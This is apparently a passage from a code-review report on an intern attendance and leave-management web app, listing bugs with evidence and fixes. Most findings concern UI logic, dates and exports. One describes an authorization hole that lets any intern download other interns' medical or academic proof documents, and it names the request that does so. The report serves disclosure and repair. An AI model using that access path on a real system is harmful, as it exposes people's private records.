**Failure:** The /admin/intern/:id/attendance call 500s because the TalentTrail upstream is down. The admin lands on Overview and sees a profile card that just has no "Meeting Attendance Rate" and no "Daily Attendance Rate" rows. They have no way to tell whether the intern has 0% attendance data or whether the request failed, and nothing prompts a retry.

**Evidence:**
```
{attendanceData && intern.startDate && (() => { ... Meeting Attendance Rate ... })()}
{attendanceData && intern.startDate && (() => { ... Daily Attendance Rate ... })()}

// attendanceError only ever rendered at line 1561, inside activeTab === "attendance"
{attendanceError && !attendanceLoading && (<div ...>{attendanceError}</div>)}
```

**Fix:** Render an inline error/retry row on the Overview card when `attendanceError` is set.

## [LOW] certificate-data is fetched on every profile load and the result is never used
`frontend/src/pages/AdminInternDetails.jsx:278` · *dead-code*

**What's wrong:** `fetchCertAttendanceCount` is called from the mount effect and stores `certData.attendanceCount` in `certAttendanceCount`, but that state variable is never read anywhere in the 2367-line file (only the declaration on line 179 and the setter on line 278 exist). The endpoint it hits, GET /api/admin/intern/:internId/certificate-data, runs `certificateController.getCertificateData`, which performs an outbound TalentTrail call. Every profile view therefore pays for an external round-trip whose result is discarded. The handler also swallows every failure with `console.warn` and a bare `if (!res.ok) return;`.

**Failure:** An admin opens 20 intern profiles while triaging non-submitters. That fires 20 unnecessary certificate-data requests, each of which calls out to talenttrail.slt.lk, adding latency and load with zero visible effect on the page.

**Evidence:**
```
const [certAttendanceCount, setCertAttendanceCount] = useState(null);   // line 179
...
setCertAttendanceCount(certData.attendanceCount ?? null);               // line 278
// no other reference to certAttendanceCount exists in the file
```

**Fix:** Either render the unified count (that was the stated intent in the comment on lines 261-263) or delete the state, the callback and its call in the mount effect.

## [LOW] "Last seen" badge can never render — the backend does not return intern.lastSeen
`frontend/src/pages/AdminInternDetails.jsx:1371` · *api-contract*

**What's wrong:** The Attendance tab header renders a "Last seen: <date> at <time>" pill gated on `intern.lastSeen`. `getInternDetails` in backend/controllers/adminController.js:367-383 constructs the `intern` payload field-by-field and never includes `lastSeen`, and the Intern model has no such field either. The block is permanently dead.

**Failure:** An admin opens any intern's Attendance tab expecting the "Last seen" indicator described by the UI code; it is never shown for any intern, on any environment, because the field does not exist in the response.

**Evidence:**
```
{intern.lastSeen && (
  <span ...>Last seen: {new Date(intern.lastSeen).toLocaleDateString(...)} at {new Date(intern.lastSeen).toLocaleTimeString(...)}</span>
)}

// backend/controllers/adminController.js:368-383 — intern payload keys:
// _id, traineeId, traineeName, email, fieldOfSpecialization, homeAddress,
// startDate, endDate, institute, team, availableDays, agreementAccepted,
// agreementAcceptedDate, projects   ← no lastSeen
```

**Fix:** Either add `lastSeen` to the getInternDetails response (e.g. derived from the newest attendance entry) or remove the dead block.

## [LOW] "Days Since Last" progress bar shows 0% for the best possible value (falsy-zero)
`frontend/src/pages/AdminInternDetails.jsx:833` · *logic-error*

**What's wrong:** The bar width uses a truthiness check on `statistics.daysSinceLastSubmission`. When the intern submitted today the backend returns `0`, which is falsy, so `width` is `0` — the same rendering as the "Never submitted" case (`null`). The scale is inverted (`100 - days*5`), so 0 days should be the fullest bar, not the emptiest.

**Failure:** An intern submitted their log this morning. The card shows the value "0" with a completely empty progress bar, identical to an intern who has never submitted anything — while an intern who last submitted 3 days ago shows an 85%-full bar. The visual ranking is exactly backwards for the best case.

**Evidence:**
```
width: statistics.daysSinceLastSubmission
  ? Math.max(5, 100 - statistics.daysSinceLastSubmission * 5)
  : 0,
```

**Fix:** Test for null explicitly: `statistics.daysSinceLastSubmission != null ? Math.max(5, 100 - statistics.daysSinceLastSubmission * 5) : 0`.

## [LOW] Commit classifier maps fix/bug commits to the "feat" colour bucket
`frontend/src/pages/AdminInternDetails.jsx:127` · *logic-error*

**What's wrong:** `getGithubCommitPrefix` returns `"feat"` for messages starting with "fix" or "bug" — a copy-paste of the line above it. `COMMIT_COLORS` has no `fix` entry, so bugfix commits are given the blue feat dot and the blue feat badge background while the badge text still reads "fix", producing a badge that says "fix" in feat colours.

**Failure:** An intern's history is "fix: null pointer in seat booking". In the GitHub Commits panel the timeline dot and badge render in feat-blue (`bg-blue-100 text-blue-700`) with the label "fix", so a reviewer skimming by colour cannot distinguish features from bugfixes.

**Evidence:**
```
if (m.startsWith("feat") || m.startsWith("feature")) return "feat";
if (m.startsWith("fix") || m.startsWith("bug")) return "feat";   // should be its own bucket
if (m.startsWith("docs") || m.startsWith("doc")) return "docs";

const COMMIT_COLORS = { feat: {...}, docs: {...}, test: {...}, chore: {...} };   // no "fix"
```

**Fix:** Return `"fix"` and add a `fix` entry to COMMIT_COLORS (e.g. rose/red).

## [LOW] Holiday fetch failure is swallowed, silently turning every holiday into an "Absent" day
`frontend/src/pages/AdminInternDetails.jsx:186` · *error-handling*

**What's wrong:** `fetchHolidays` never checks `response.ok`; it calls `response.json()` and only acts `if (data.holidays)`. The backend holiday route returns 500 with `{ error: "HOLIDAY_API_URL is not configured in .env" }` or `{ error: "Failed to fetch holidays" }` (backend/routes/holidayRoutes.js), which has no `holidays` key, so the failure is invisible: `holidays` stays `[]`, `getHolidayForDate` returns undefined for every date, and every public holiday is then rendered by the Absent branch on line 1757. Separately, the effect on lines 225-231 re-requests the same year on every single month-navigation click with no already-fetched guard, so paging through 12 months of one year issues 12 identical external requests.

**Failure:** HOLIDAY_API_KEY expires. Every intern's attendance calendar now shows red "Absent" chips on Vesak, Poya days and every other public holiday, with no error anywhere in the UI — admins conclude interns skipped work on national holidays.

**Evidence:**
```
const response = await fetch(`${API_BASE_URL}/holidays/${year}`);
const data = await response.json();          // no response.ok check
if (data.holidays) { setHolidays(prev => ...); }

// backend/routes/holidayRoutes.js
return res.status(500).json({ error: "HOLIDAY_API_URL is not configured in .env" });
res.status(500).json({ error: "Failed to fetch holidays" });
```

**Fix:** Check `response.ok`, surface a non-blocking "holiday calendar unavailable" notice, and keep a `Set` of already-fetched years so month navigation does not refire the request.

# AdminInternRecords — 6 findings

## [HIGH] A 403 from the intern-details endpoint deletes the admin session and force-logs-out the user
`frontend/src/pages/AdminInternRecords.jsx:55` · *permissions-auth*

**What's wrong:** `adminApi.getInternDetails` throws `Failed to fetch intern details: ${status}` for any non-OK response (adminApi.js:133). The catch block string-matches "403" and wipes `adminInfo`. /api/admin/intern/:internId is gated by `enforceRoutePermission` → `interns.view` (adminAuth.js:37), so a 403 here means a missing permission, not an invalid token. The `error.message` access also has no optional chaining, unlike the equivalent code in AdminDailyRecords.jsx:97.

**Failure:** An admin account provisioned with `permissions: ["dashboard.view", "daily_logs.view"]` browses Daily Logs and clicks "View Records" on any row (the button is rendered unconditionally in AdminDailyRecords.jsx:683). The backend returns 403 "Permission required: interns.view". Rather than showing a permission message, this page deletes `adminInfo` and redirects to /admin-login — the admin's entire session is destroyed by clicking a button that should never have been enabled for them.

**Evidence:**
```
line 55-58: `if (error.message.includes("403") || error.message.includes("401")) { localStorage.removeItem("adminInfo"); navigate("/admin-login"); }`
```

**Fix:** Remove the 403 branch (401 is already centrally handled by `checkAuth`/`handleUnauthorized` in adminApi.js:4-20) and render a dedicated "insufficient permission" state. Use `error?.message?.includes(...)` defensively, and hide the "View Records" entry point behind `hasAdminPermission("interns.view")`.

## [MEDIUM] Clicking the SLT logo silently wipes all of localStorage and logs the admin out
`frontend/src/pages/AdminInternRecords.jsx:248` · *data-integrity*

**What's wrong:** The logo block's onClick calls `localStorage.clear()` and navigates to the admin login page. Nothing in the UI indicates the logo is a logout control — it is styled as a branding element with the caption "SLT Admin Portal / Intern Records", and there is a separate, explicitly labelled Logout button 40 lines below that correctly only removes `adminInfo` (line 293).

**Failure:** An admin reviewing an intern's logbook clicks the SLT logo expecting to go back to the dashboard (the conventional behaviour everywhere else in the app). Instead they are instantly logged out with no confirmation, and `localStorage.clear()` also destroys every unrelated key on the origin — any intern `userData`/`authToken`, `gateStaffInfo`, and any cached UI preferences — for whoever uses that browser next.

**Evidence:**
```
line 246-253: `<motion.div ... onClick={() => { localStorage.clear(); navigate("/admin-login"); }}` versus line 292-295 `onClick={() => { localStorage.removeItem("adminInfo"); navigate("/admin-login"); }}`.
```

**Fix:** Make the logo navigate to /admin/dashboard. If a logout is genuinely wanted there, use `localStorage.removeItem("adminInfo")` (matching the Logout button) and add a confirmation.

## [MEDIUM] Period filter cuts off at the current clock time, dropping records from the boundary day
`frontend/src/pages/AdminInternRecords.jsx:84` · *date-timezone*

**What's wrong:** `filterDate` is initialised to `new Date()` (i.e. now, including the current time of day) and then only the day-of-month is shifted back. The comparison at line 102 is `new Date(record.createdAt) >= filterDate`, so the boundary day is included only from the current wall-clock time onwards instead of from its start.

**Failure:** It is 2026-08-05 at 15:00. The admin picks "Last Week" expecting the last 7 days. `filterDate` becomes 2026-07-29T15:00. A logbook entry submitted on 2026-07-29 at 09:30 — squarely inside the last week — is filtered out. The counter reads "Showing 4 of 5 records" and the admin concludes the intern skipped a day they actually logged. The same off-by-part-of-a-day applies to "Last Month" and "Last 3 Months".

**Evidence:**
```
line 83-84: `const now = new Date(); const filterDate = new Date();` then line 88 `filterDate.setDate(now.getDate() - 7);` and line 101-103 `filtered.filter((record) => new Date(record.createdAt) >= filterDate)`.
```

**Fix:** Normalise the cutoff to the start of the boundary day: `filterDate.setHours(0, 0, 0, 0)` after the `setDate(...)` call. Consider filtering on the logical `record.date` string ("YYYY-MM-DD", the field the card actually displays) rather than the `createdAt` timestamp.

## [LOW] Staggered per-index animation delay leaves most of the list invisible for seconds on long logbooks
`frontend/src/pages/AdminInternRecords.jsx:488` · *react-effect*

**What's wrong:** Every card animates in from `opacity: 0` with `delay: index * 0.05` seconds. `getInternDetails` (adminController.js:290-304) returns every record the intern has ever submitted with no limit, and this page has no pagination, so `index` grows without bound. Because the cards are keyed by `record._id` inside `AnimatePresence`, changing the search or period filter unmounts and remounts them, restarting the stagger from zero.

**Failure:** A 6-month intern has 120 logbook entries. Opening the page, the last card does not become visible until 6 seconds after the data arrives; scrolling down immediately shows a wall of blank space. Typing a search term and then clearing it re-mounts all 120 cards, so the admin stares at an apparently empty list for another 6 seconds even though `filteredRecords.length` already reads 120.

**Evidence:**
```
line 486-488: `initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: index * 0.05, duration: 0.3 }}` inside `filteredRecords.map((record, index) => ...)`.
```

**Fix:** Cap the stagger, e.g. `delay: Math.min(index, 10) * 0.05`, and add pagination or virtualisation for the record list (the endpoint already returns everything unbounded).

## [LOW] `window.innerWidth` is read during render with no resize listener, so the date format never updates
`frontend/src/pages/AdminInternRecords.jsx:509` · *react-state*

**What's wrong:** The record header formats its date using `window.innerWidth < 640 ? "short" : "long"` for both `weekday` and `month`. `window.innerWidth` is not React state and no resize/matchMedia listener is registered, so the value is frozen at whatever it was during the last render triggered by something else.

**Failure:** An admin opens the page on a phone in portrait (innerWidth 390) and sees "Mon, Aug 4, 2026". They rotate to landscape (innerWidth 844). No React state changed, so nothing re-renders and the headings stay in the abbreviated mobile format, out of step with the rest of the layout, which does reflow via Tailwind breakpoints.

**Evidence:**
```
line 508-514: `weekday: window.innerWidth < 640 ? "short" : "long", ... month: window.innerWidth < 640 ? "short" : "long",`
```

**Fix:** Use CSS (render both variants and toggle with Tailwind's `sm:` classes), or drive it from a `useMediaQuery`-style hook backed by `window.matchMedia("(min-width: 640px)")` with a change listener.

## [LOW] Record date is parsed as UTC midnight, shifting the displayed day back one in negative-offset timezones
`frontend/src/pages/AdminInternRecords.jsx:505` · *date-timezone*

**What's wrong:** `record.date` is a plain "YYYY-MM-DD" string written server-side in Asia/Colombo (DailyRecord.js:13-16, dailyRecordController.js:69). `new Date("2026-08-04")` is specified to parse as UTC midnight, and `toLocaleDateString` then renders it in the viewer's local zone. AdminDailyRecords.jsx deliberately avoids this by appending `"T00:00:00"` (lines 198 and 461); this page does not.

**Failure:** An admin travelling in New York (UTC-4) opens an intern's records. A record with `date: "2026-08-04"` is parsed as 2026-08-04T00:00:00Z, which is 2026-08-03 20:00 local, so the card heading reads "Sunday, August 3, 2026" while the record's stored date — and the same record on the Daily Logs page — say August 4. The admin reports the intern logged on the wrong day.

**Evidence:**
```
line 505: `new Date(record.date).toLocaleDateString("en-US", {...})` — compare AdminDailyRecords.jsx:198 `const d = new Date(dateStr + "T00:00:00");`
```

**Fix:** Parse as local midnight for consistency with the rest of the app: `new Date(record.date + "T00:00:00")`. Better, extract the existing `toDateStr`/`prettyDate` helpers from AdminDailyRecords.jsx into a shared util and use it in both pages.

# AdminDailyRecords — 12 findings

## [HIGH] Pending debounced search fetch is never cancelled on date change or search clear, so a stale response overwrites the table
`frontend/src/pages/AdminDailyRecords.jsx:114` · *race-condition*

**What's wrong:** `handleSearchChange` (line 124-131) schedules a 400 ms `setTimeout` that closes over the `selectedDate` value from the render in which the handler was created. `switchDate` (line 114-118) and the clear-search button (line 412) both change the filter and fire an immediate `fetchRecords(...)`, but neither calls `clearTimeout(searchTimer.current)`. There is also no AbortController or request-sequence guard in `fetchRecords` (line 68-105), so whichever response lands last wins.

**Failure:** Admin is on 2026-08-04 and types "john" in the search box. Within 400 ms of the last keystroke they pick 2026-08-03 in the date picker. `switchDate` sets selectedDate=2026-08-03, clears searchTerm and fetches (date=2026-08-03, search=""), which renders correctly. 400 ms later the orphaned timer fires `fetchRecords({page:1, date:"2026-08-04", search:"john"})` and its response overwrites `records` and `pagination`. The date input, the "Submissions — August 3, 2026" heading and the empty search box all say 2026-08-03/unfiltered, while the table body shows only John's 2026-08-04 row. The same thing happens when the user types "john" and then clicks the X clear button inside 400 ms: the list re-filters itself back to John with an empty search box.

**Evidence:**
```
line 116-117: `setSearchTerm(""); fetchRecords({ page: 1, date: val, search: "" });` — no `clearTimeout(searchTimer.current)` anywhere in `switchDate`; line 128-130 the pending timer calls `fetchRecords({ page: 1, date: selectedDate, search: val })` with the captured old `selectedDate`.
```

**Fix:** Call `clearTimeout(searchTimer.current)` at the top of `switchDate` and in the clear-search onClick, and add a monotonically increasing request-id ref in `fetchRecords` (or an AbortController) so only the newest in-flight response is allowed to call `setRecords`/`setPagination`.

## [HIGH] Sort toggle only reverses the current 50-row page, so "Oldest" shows the wrong records
`frontend/src/pages/AdminDailyRecords.jsx:137` · *logic-error*

**What's wrong:** `displayedRecords` is computed purely client-side by reversing the current page array. The backend `getAllDailyRecords` always sorts `{ createdAt: -1 }` (adminController.js:645) and the sort direction is never sent as a query param — `adminApi.getAllDailyRecords` only forwards page/limit/search/date (adminApi.js:268-280). The control is presented as a global "↓ Newest / ↑ Oldest" sort next to a server-paginated table.

**Failure:** A date has 120 submissions (3 pages of 50). The admin clicks the sort button to switch to "↑ Oldest" expecting the first submission of the day at the top. Page 1 still holds the 50 newest records; reversing it puts the 50th-newest record at the top. The genuinely oldest submission of the day is on page 3 and is never shown at the top. The admin reads a wrong "first submitter of the day".

**Evidence:**
```
line 136-138: `// Sort is local only (just reverses current page slice)` / `const displayedRecords = sortOrder === "desc" ? records : [...records].reverse();`
```

**Fix:** Send the sort direction to the server (e.g. `sort=asc|desc`), have `getAllDailyRecords` apply `.sort({ createdAt: sortDir })`, and refetch page 1 when the toggle changes. Alternatively remove the toggle if only page-local ordering is intended.

## [HIGH] A 403 from the daily-records endpoint deletes the admin session and force-logs-out the user
`frontend/src/pages/AdminDailyRecords.jsx:97` · *permissions-auth*

**What's wrong:** `adminApi.getAllDailyRecords` throws `new Error(\`Failed to fetch daily records: ${response.status}\`)` on any non-OK response (adminApi.js:289). The catch block string-matches "403" and treats it as an authentication failure, wiping `adminInfo` and redirecting to the login page. A 403 from `enforceRoutePermission` means "you lack daily_logs.view", not "your token is invalid" — the token is still perfectly valid (401 is already handled centrally by `checkAuth`/`handleUnauthorized`). The identical pattern exists in AdminInternRecords.jsx:55.

**Failure:** A custom admin account is provisioned with `permissions: ["dashboard.view", "interns.view"]` (no `daily_logs.view`). They open /admin/daily-records (the nav link is hidden but the URL is bookmarkable and AdminRoute only checks for a token). The backend returns 403 `{message: "Permission required: daily_logs.view"}`. Instead of "You don't have access to Daily Logs", the page silently deletes `adminInfo` and bounces them to /admin-login, losing their whole session and forcing a re-login. The same happens for a `daily_logs.view`-only user who clicks the "View Records" button (line 685), because /api/admin/intern/:internId requires `interns.view`.

**Evidence:**
```
line 97-100: `if (err.message?.includes("403") || err.message?.includes("401")) { localStorage.removeItem("adminInfo"); navigate("/admin-login"); }`
```

**Fix:** Drop the 403 branch (401 is already handled by `checkAuth` → `handleUnauthorized`). Have `getAllDailyRecords` surface `response.status`, and on 403 render a "You do not have permission to view Daily Logs" panel without touching localStorage. Also gate the "View Records" button behind `hasAdminPermission("interns.view")`.

## [MEDIUM] `record.Trainee_ID` / `record.Trainee_Name` fallbacks reference fields that do not exist on DailyRecord
`frontend/src/pages/AdminDailyRecords.jsx:550` · *api-contract-mismatch*

**What's wrong:** The table, mobile cards and CSV export all fall back to `record.Trainee_Name` and `record.Trainee_ID` when the populated `record.internId` is missing. The DailyRecord schema has no such fields — the denormalised copy is stored as `traineeId` (lowercase t, camelCase; models/DailyRecord.js:10-12, written by dailyRecordController.js:106/118). The fallback therefore always evaluates to `undefined` and collapses to "N/A".

**Failure:** An Intern document is removed or its _id changes, leaving DailyRecord rows whose `internId` no longer resolves. Mongoose `populate` sets `record.internId` to null, so `record.internId?.Trainee_ID` is undefined and `record.Trainee_ID` is undefined too. The row renders as "N/A / ID: N/A" and the CSV column shows "N/A", even though the record carries `traineeId: "1234"` and could have identified the intern. Admin cannot tell whose log entry it is.

**Evidence:**
```
line 549-552: `const tid = record.internId?.Trainee_ID || record.Trainee_ID || "N/A";` (also lines 635-638 and 157-158 in the CSV builder); DailyRecord.js:10 declares `traineeId: { type: String }`.
```

**Fix:** Change the fallbacks to `record.traineeId` (and drop the non-existent `record.Trainee_Name` fallback, or add a denormalised name field to the schema). Also add `traineeId` to the `.populate`/projection so it is always available.

## [MEDIUM] "View Records" navigates to /admin/intern/null/records when the record's intern reference is dangling
`frontend/src/pages/AdminDailyRecords.jsx:553` · *crash-error-handling*

**What's wrong:** `iid` is derived as `record.internId?._id || record.internId`. When `populate` cannot resolve the reference it sets `record.internId` to `null`, so `iid` becomes `null` and the template literal produces the literal path segment "null". There is no guard disabling the button in that case.

**Failure:** An orphaned DailyRecord (intern deleted) is listed for a given date. The admin clicks "View Records". The app routes to /admin/intern/null/records; AdminInternRecords calls GET /api/admin/intern/null, where `Intern.findById("null")` throws a Mongoose CastError, which adminController.js:396-399 turns into a 500. The admin sees the generic red "Failed to load intern records" screen with a Retry button that can never succeed, and no explanation.

**Evidence:**
```
line 553: `const iid = record.internId?._id || record.internId;` then line 591-594 `navigate(\`/admin/intern/${iid}/records\`, ...)` (duplicated at lines 639 and 685-687).
```

**Fix:** Compute `const iid = record.internId?._id ?? null;` and render the View button disabled (or omit it) when `iid` is falsy. Separately, guard `getInternDetails` with `mongoose.Types.ObjectId.isValid(internId)` and return 404 instead of 500.

## [MEDIUM] Row numbers are wrong when the sort toggle is set to "Oldest"
`frontend/src/pages/AdminDailyRecords.jsx:641` · *logic-error*

**What's wrong:** `rowNum` is computed from the array index of the *displayed* (possibly reversed) list, `(pagination.page - 1) * LIMIT + idx + 1`, but the offset assumes the server-side descending order. When `sortOrder === "asc"` the array is reversed (line 138) while the numbering still counts 1..50 top-down, so every row is labelled with the number of the row that would be in that slot under the other sort.

**Failure:** On page 1 with 50 records, the admin toggles to "↑ Oldest". The record that the descending view numbered #50 now sits at the top but is labelled "1", and the record numbered #1 sits at the bottom labelled "50". If the admin cross-references "submission #12" between the two sort modes they get two different records.

**Evidence:**
```
line 641-642: `const rowNum = (pagination.page - 1) * LIMIT + idx + 1;` combined with line 137-138 `sortOrder === "desc" ? records : [...records].reverse()`.
```

**Fix:** Compute the row number against the unreversed index: when sorting ascending use `(pagination.page - 1) * LIMIT + (displayedRecords.length - idx)`, or better, sort server-side (see the sort finding) so the index always matches the offset.

## [MEDIUM] CSV export silently exports only the current page while the toast claims it exported the day
`frontend/src/pages/AdminDailyRecords.jsx:155` · *file-export*

**What's wrong:** `handleExportCSV` builds the CSV from `displayedRecords`, which is the current 50-row page returned by the server, not the full result set for the selected date/search. There is no second fetch with a larger limit and no warning in the UI. The success toast phrases it as records "for {selectedDate}", which reads as the whole day.

**Failure:** A date has 120 submissions. The page header reads "120 records total". The admin clicks "Export CSV" and receives daily_records_2026-08-04_p1.csv containing 50 rows, with a green toast reading "Exported 50 records for 2026-08-04". The admin files that CSV as the day's complete submission list; 70 interns are missing from the report.

**Evidence:**
```
line 155: `const csvData = displayedRecords.map((r) => ({...}))` and line 187-189: `notificationUtils.showSuccess(\`Exported ${displayedRecords.length} records for ${selectedDate}\`)`.
```

**Fix:** Fetch all matching rows for the export (e.g. call `adminApi.getAllDailyRecords({ page: 1, limit: pagination.total, date, search })` — the backend caps limit at 200 (adminController.js:595), so either raise that cap for exports or loop over pages) before building the CSV. If page-only export is intended, label the button "Export this page" and say so in the toast.

## [MEDIUM] `todayStr` is a module-level constant, so the page is stuck on the previous day after midnight and follows the browser timezone
`frontend/src/pages/AdminDailyRecords.jsx:39` · *date-timezone*

**What's wrong:** `todayStr` is evaluated once when the module is first imported and then used as the initial `selectedDate`, as the `max` attribute of the date input, in the "Today — …" label and by the "Go to Today" button. It is derived from the browser clock, while the `date` field it is matched against is written server-side from `moment().tz("Asia/Colombo")` (backend/utils/timeRestriction.js:54-57).

**Failure:** An operations admin leaves the Daily Logs tab open overnight (a normal pattern for a monitoring screen). At 09:00 the next morning, `todayStr` is still yesterday's date. The date input's `max={todayStr}` prevents them from picking today at all, the "Go to Today" button jumps to yesterday, and the header still says "Today — <yesterday>". They see zero of the current day's submissions and there is nothing on screen to explain why. Separately, an admin whose machine TZ is set to anything behind UTC+05:30 lands on the wrong default day (their local date is one behind Colombo's after ~18:30 UTC).

**Evidence:**
```
line 39: `const todayStr = toDateStr(new Date());` — outside the component body, referenced at lines 110, 121, 205, 378 (`max={todayStr}`), 442, 525 and 529.
```

**Fix:** Compute today inside the component (`const todayStr = useMemo(() => toDateStr(new Date()), [])`) and refresh it on a timer / on window focus, and derive it in Asia/Colombo rather than from the browser's local zone (e.g. `new Intl.DateTimeFormat("en-CA", { timeZone: "Asia/Colombo" }).format(new Date())`).

## [MEDIUM] Logbook export ignores a half-specified date range and returns every record for every intern
`backend/controllers/logbookExportController.js:61` · *logic-error*

**What's wrong:** `buildDateQuery` only applies a range when BOTH `startDate` and `endDate` are truthy; with just one of them present it falls through to `return {}` (baseTemplate.js:31-35). For an admin caller (`isAdmin === true`) no `internId` scope is added, so `DailyRecord.find({})` at line 79 loads the entire collection, unpaginated, and renders it into a single document. The filename builder at line 99-100 branches on `startDate` alone, so it stringifies the missing `endDate`.

**Failure:** An admin (or any client) hits GET /api/records/export/pdf?startDate=2026-08-01 with the end date left blank. Instead of an error or a 1-day report, the server executes an unfiltered `DailyRecord.find({})`, populates every intern on every row, and buffers a PDF of the entire history into memory before sending it — a multi-second-to-minute stall or an out-of-memory crash on a production dataset. The download that does arrive is named `daily-records-2026-08-01-to-undefined-default.pdf` and contains records far outside the requested range, while the header label reads "All Records".

**Evidence:**
```
logbookExportController.js:61 `const dateQuery = buildDateQuery({ date, startDate, endDate });`; baseTemplate.js:31-35 `if (date) return { date }; if (startDate && endDate) return { date: { $gte: startDate, $lte: endDate } }; return {};`; logbookExportController.js:79-81 `DailyRecord.find(dateQuery).populate(...).sort(...)` with no `.limit()`; line 99-100 `\`daily-records-${startDate}-to-${endDate}-${tmpl.id}.${ext}\``.
```

**Fix:** Validate the query params in `exportDailyRecordsPDF`: reject with 400 when exactly one of `startDate`/`endDate` is supplied, and require at least one date filter (or an explicit `all=true` flag) for admin exports. Add a hard `.limit()` / record-count guard before generating the document.

## [LOW] Blob URL from the CSV export is never revoked
`frontend/src/pages/AdminDailyRecords.jsx:180` · *file-export*

**What's wrong:** `URL.createObjectURL(blob)` is assigned to the anchor and the anchor is removed from the DOM, but `URL.revokeObjectURL` is never called. The browser keeps the entire CSV blob alive for the lifetime of the document.

**Failure:** An admin steps through 30 dates exporting a CSV for each without reloading the page. Thirty blobs (each up to a few hundred KB) stay pinned in memory for the whole session because nothing releases the object URLs. On a long-lived tab the tab's memory grows monotonically.

**Evidence:**
```
line 180-185: `link.href = URL.createObjectURL(blob); ... link.click(); document.body.removeChild(link);` — no `URL.revokeObjectURL(link.href)`.
```

**Fix:** Capture the URL in a variable and call `URL.revokeObjectURL(url)` after `link.click()` (or in a `setTimeout(..., 0)` to be safe across browsers).

## [LOW] CSV cells are quoted twice, leaving literal quote characters in the output, and Trainee ID loses leading zeros
`frontend/src/pages/AdminDailyRecords.jsx:157` · *file-export*

**What's wrong:** `csvData` pre-wraps some values in quotes (`\`"${name}"\`` for Trainee Name, `\`="${...}"\`` for Date and Submitted At). The generic escaper at line 168-173 then sees a `"` or `,` inside those already-quoted strings and quotes/doubles them a second time. Trainee ID (line 158) gets no `="…"` protection at all, unlike the other identifier-ish columns.

**Failure:** An intern named `Perera, Nimal` appears in the export. `csvData["Trainee Name"]` is the string `"Perera, Nimal"` (quotes included). The escaper sees a comma, wraps again and doubles the inner quotes, emitting `"""Perera, Nimal"""`. Excel renders the cell as `"Perera, Nimal"` with the quote characters visible in the data. Separately, a Trainee ID of `0123` is emitted bare and Excel converts it to the number 123, so the ID no longer matches the system of record.

**Evidence:**
```
line 157 `"Trainee Name": \`"${r.internId?.Trainee_Name || r.Trainee_Name || "N/A"}"\`,`, line 158 `"Trainee ID": r.internId?.Trainee_ID || r.Trainee_ID || "N/A",`, and line 169-172 `const v = String(row[h] || ""); return v.includes(",") || v.includes('"') ? \`"${v.replace(/"/g, '""')}"\` : v;`
```

**Fix:** Put raw values into `csvData` and let the single escaper at line 168-173 do all quoting; apply the `="…"` text-preservation wrapper consistently (including Trainee ID) as a separate, post-escape step, and add `\n`/`\r` to the characters that trigger quoting.

## [LOW] Debounce timer is never cleared on unmount and the retry button drops the active search
`frontend/src/pages/AdminDailyRecords.jsx:65` · *react-effect*

**What's wrong:** `searchTimer` has no `useEffect` cleanup, so a pending 400 ms fetch survives unmount and can call `setError`/`navigate` on a dead component. Separately, `fetchRecords` is memoized with `[navigate]` only (line 106), which freezes its `date = selectedDate, search = searchTerm` default parameters at their first-render values; the error-screen Retry handler at line 327-329 relies on that default for `search`.

**Failure:** Admin types "nimal", then within 400 ms clicks a nav link to another admin page. The orphaned timer fires against the unmounted component; if that request fails with 403 the handler runs `localStorage.removeItem("adminInfo")` and `navigate("/admin-login")`, kicking the admin out of the page they just opened. Separately: with a search of "nimal" active on page 3, a transient network error shows the error screen; clicking Retry calls `fetchRecords({ isInitial: true, date: selectedDate })`, which resolves `search` to the frozen `""` and `page` to 1 — the admin silently gets the unfiltered first page back while the search input still displays "nimal".

**Evidence:**
```
line 65 `const searchTimer = useRef(null);` with no cleanup effect; line 106-107 `}, [navigate]); // eslint-disable-line react-hooks/exhaustive-deps`; line 327-329 `onClick={() => fetchRecords({ isInitial: true, date: selectedDate })}`.
```

**Fix:** Add `useEffect(() => () => clearTimeout(searchTimer.current), [])`. Keep the current filter values in a ref (or pass them explicitly everywhere) instead of relying on frozen default parameters, and have Retry pass `search: searchTerm, page: pagination.page`.

# AdminLeaveManagement — 25 findings

## [CRITICAL] IDOR: any authenticated intern can download any other intern's leave proof document
`backend/controllers/leaveRequestController.js:425` · *security/authorization*

**What's wrong:** The page's document viewer calls GET /leave-requests/:id/document (AdminLeaveManagement.jsx:196-203). That route is registered in backend/routes/leaveRequestRoutes.js:50 as a "shared route" with only `authenticateUser` — no `requireAdmin`, no `requirePermission`. The controller `getLeaveRequestDocument` performs NO ownership or role check at all: it loads the request by id and streams the base64 proof document back. Compare `getLeaveRequestById` (same file, line 81-97) which DOES check `isAdmin || isOwner`. The proof documents attached to extended-leave requests are medical/academic certificates containing personal data, and the record itself carries the intern's NIC.

**Failure:** Intern A logs in normally, opens devtools, and calls GET /api/leave-requests/<any-other-request-id>/document with their own intern JWT (ids are exposed to any admin, and are guessable/enumerable ObjectIds). The server returns 200 with intern B's uploaded medical certificate / academic proof PDF. No 403 is ever produced.

**Evidence:**
```
routes: `router.get("/:id/document", leaveRequestController.getLeaveRequestDocument);` (leaveRequestRoutes.js:50, after `router.use(authenticateUser)` only)
controller: `async getLeaveRequestDocument(req, res, next) { const { id } = req.params; const leaveRequest = await leaveRequestService.getLeaveRequestById(id); if (!leaveRequest || !leaveRequest.proofDocument ...) return 404; ... res.send(fileBuffer); }` — no `req.user` comparison anywhere.
```

**Fix:** Add the same authorization block used by `getLeaveRequestById`: resolve `const adminUser = await User.findById(req.user.id)` and `const isOwner = leaveRequest.intern._id.toString() === (req.user.internId || req.user.id).toString()`, and return 403 when neither holds.

## [HIGH] Stat cards show today-only counts while the table shows all dates (short-leave page)
`frontend/src/pages/AdminLeaveManagement.jsx:174` · *api-contract-mismatch*

**What's wrong:** `fetchLeaveRequests` and `fetchStats` build the date parameter with different rules. `fetchLeaveRequests` (lines 130-134) sends **no** date param when `selectedDate` is empty, so the list is unfiltered across all dates. `fetchStats` (lines 171-175) falls back to `params.date = selectedDate || new Date().toISOString().split("T")[0]` for the short-leave page, so the stats are always scoped to a single day. The two calls therefore describe different data sets, and `displayedStats` (line 530) short-circuits to the raw `stats` for `!isStudyLeave`, so no fallback masks it.

**Failure:** Admin opens /admin/leave-requests, clicks the X next to the date picker (line 653) to clear the date filter. The table now lists every pending short-leave request ever submitted (e.g. 340 rows across 22 pages), but the four stat cards and the "Active Filter: Pending Requests (N)" chip show only today's counts (e.g. Total 3 / Pending 3). Admin reads "3 pending" and closes the page while 340 are actually outstanding.

**Evidence:**
```
fetchLeaveRequests:
```js
